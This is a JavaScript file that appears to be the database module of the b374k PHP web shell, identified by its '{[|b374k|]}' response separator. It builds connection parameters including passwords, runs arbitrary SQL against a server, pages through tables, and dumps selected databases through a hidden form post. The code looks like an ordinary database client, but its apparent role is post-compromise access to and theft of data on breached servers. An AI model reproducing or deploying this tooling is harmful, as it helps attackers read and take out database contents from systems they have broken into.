Zepto(function($){
	db_init();

});

var dbSupported = "";
var dbPageLimit = 50;

function db_conn_info() {
	dbType = $('#dbType').val();
	dbHost = $('#dbHost').val();
	dbUser = $('#dbUser').val();
	dbPass = $('#dbPass').val();
	dbPort = $('#dbPort').val();
	dbCountRows = $('#dbCountRows')[0].checked;

	return {dbType:dbType, dbHost:dbHost, dbUser:dbUser, dbPass:dbPass, dbPort:dbPort, dbCountRows:dbCountRows};
}

function db_init(){
	if((dbSupported = localStorage.getItem('db_supported'))){
		db_bind();
		output("db : "+dbSupported);
		db_add_supported();
	}
	else{
		send_post({dbGetSupported:""}, function(res){
			if(res!="error"){
				localStorage.setItem('dbSupported', res);
				dbSupported = res;
				db_bind();
				output("db : "+dbSupported);
				db_add_supported();
			}
		});
	}
}

function db_add_supported(){
	splits = dbSupported.split(",");
	$.each(splits, function(i, k){
		$('#dbType').append("<option>"+k+"</option>");
	});
}

function db_bind(){
	$('#dbType').on('change', function(e){
		type = $('#dbType').val();
		if((type=='odbc')||(type=='pdo')){
			$('.dbHostLbl').html('DSN / Connection String');
			$('.dbUserRow').show();
			$('.dbPassRow').show();
			$('.dbPortRow').hide();

		}
		else if((type=='sqlite')||(type=='sqlite3')){
			$('.dbHostLbl').html('DB File');
			$('.dbUserRow').hide();
			$('.dbPassRow').hide();
			$('.dbPortRow').hide();

		}
		else{
			$('.dbHostLbl').html('Host');
			$('.dbUserRow').show();
			$('.dbPassRow').show();
			$('.dbPortRow').show();
		}
	});

	$('#dbQuery').on('focus', function(e){
		if($('#dbQuery').val()=='You can also press ctrl+enter to submit'){
			$('#dbQuery').val('');
		}
	});
	$('#dbQuery').on('blur', function(e){
		if($('#dbQuery').val()==''){
			$('#dbQuery').val('You can also press ctrl+enter to submit');
		}
	});
	$('#dbQuery').on('keydown', function(e){
		if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
			db_run();
		}
	});
}

function db_nav_bind(){
	dbType = $('#dbType').val();
	$('.boxNav').off('click');
	$('.boxNav').on('click', function(){
		$(this).next().toggle();
	});

	$('.dbTable').off('click');
	$('.dbTable').on('click', function(){
		type = $('#dbType').val();
		table = $(this).html();
		db = $(this).parent().parent().parent().prev().html();
		db_query_tbl(type, db, table, 0, dbPageLimit);
	});
}

function db_connect(){
	send_post(db_conn_info(), function(res){
		if(res.indexOf('error') != 0){
			splits = res.split('{[|b374k|]}');
			if(splits.length==2){
				$('#dbExportList').html(splits[0]);
				$('#dbNav').html(splits[1]);
			} else {
				$('#dbNav').html(res);
			}
			$('.box-database').hide();
			$('.dbError').html('')
			$('.dbQueryRow').show();
			$('#dbBottom').show();
			$('#dbExport').show();
			db_nav_bind();
		} else $('.dbError').html('Unable to connect: '+res);
	});
}

function db_disconnect(){
	$('.box-database').show();
	$('.dbQueryRow').hide();
	$('#dbNav').html('');
	$('#dbResult').html('');
	$('#dbExport').hide();
	$('#dbBottom').hide();
}

function db_run(){
	dbConnInfo = db_conn_info();
	dbQuery = $('#dbQuery').val();

	if((dbQuery!='')&&(dbQuery!='You can also press ctrl+enter to submit')){
		dbConnInfo.dbQuery = dbQuery;
		send_post(dbConnInfo, function(res){
			if(res.indexOf('error') != 0){
				$('#dbResult').html(res);
				$('.tblResult').each(function(){
					sorttable.k(this);
				});
			}
		});
	}
}

function db_query_tbl(type, db, table, start, limit){
	dbConnInfo = $.extend(db_conn_info(), {dbQuery:'', dbDB:db, dbTable:table, dbStart:start, dbLimit:limit});

	send_post(dbConnInfo, function(res){
		if(res.indexOf('error') != 0){
			$('#dbResult').html(res);
			$('.tblResult').each(function(){
				sorttable.k(this);
			});
		}
	});
}

function db_pagination(type){
	db = $('#dbDB').val();
	table = $('#dbTable').val();
	start = parseInt($('#dbStart').val());
	limit = parseInt($('#dbLimit').val());
	dbType = $('#dbType').val();

	if(type=='next'){
		start = start+limit;
	}
	else if(type=='prev'){
		start = start-limit;
		if(start<0) start = 0;
	}
	db_query_tbl(dbType, db, table, start, limit);
}

function db_dump_select_batch(op){
	$('td#dbExportList input[type=checkbox]').each(function(){
		$(this)[0].checked = op;
	});
}

function db_dump_do(){
	var dbs = [];
	$('td#dbExportList input[type=checkbox]').each(function(){
		if($(this)[0].checked) {
			dbs.push($(this).val());
		}
	});
	dbConnInfo = db_conn_info();
	dbConnInfo['dbDump'] = dbs.join(',');
	for (var key in dbConnInfo) { 
		$('#form').append("<input type='hidden' name='"+key+"' value='"+dbConnInfo[key]+"'>");
	}
	$('#form').submit();
	$('#form').html('');
	hide_box();
}